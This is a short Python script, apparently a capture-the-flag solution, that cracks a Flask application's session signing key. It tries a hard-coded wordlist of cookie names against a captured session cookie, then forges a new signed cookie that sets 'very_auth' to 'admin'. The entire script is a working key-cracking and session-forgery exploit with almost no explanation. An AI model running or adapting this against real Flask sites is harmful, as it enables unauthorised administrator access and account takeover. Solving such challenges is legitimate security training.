#!/usr/bin/python3

# 29. April 2022

import hashlib
from flask.json.tag import TaggedJSONSerializer
from flask import Flask
from itsdangerous import BadSignature, URLSafeTimedSerializer

# wordlist
secret_keys = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz",
               "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

session_cookie = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Ymuegw.CRsWDDNOer-Y5gkQK0wLVaYSulg"

app = Flask(__name__)

# secret_key = secret_keys[0]
serializer = TaggedJSONSerializer()
signer_kwargs = dict(
    key_derivation="hmac", digest_method=staticmethod(hashlib.sha1)
)


def get_signing_serializer(secret_key):
    return URLSafeTimedSerializer(secret_key, salt="cookie-session", serializer=serializer, signer_kwargs=signer_kwargs)


def check_signature(session_cookie, secret_key):
    try:
        s = get_signing_serializer(secret_key)
        data = s.loads(session_cookie,  max_age=int(
            app.permanent_session_lifetime.total_seconds()))
        print('Valid signature')
        print('data:', data)
        return True
    except BadSignature:
        # print('Invalid signature')
        return False


# check_signature(session_cookie)

# index
def get_secret_index(session_cookie):
    for index, secret in enumerate(secret_keys):
        # print("Trying:", secret)
        # print("Trying:", index)
        app.secret_key = secret
        if(check_signature(session_cookie, secret)):
            print("Trying:", secret)
            print("True:", index)
            return index
    return -1


index = get_secret_index(session_cookie)

# print(index)

val = get_signing_serializer(secret_keys[index]).dumps(
    dict({'very_auth': 'admin'}))
print(val)
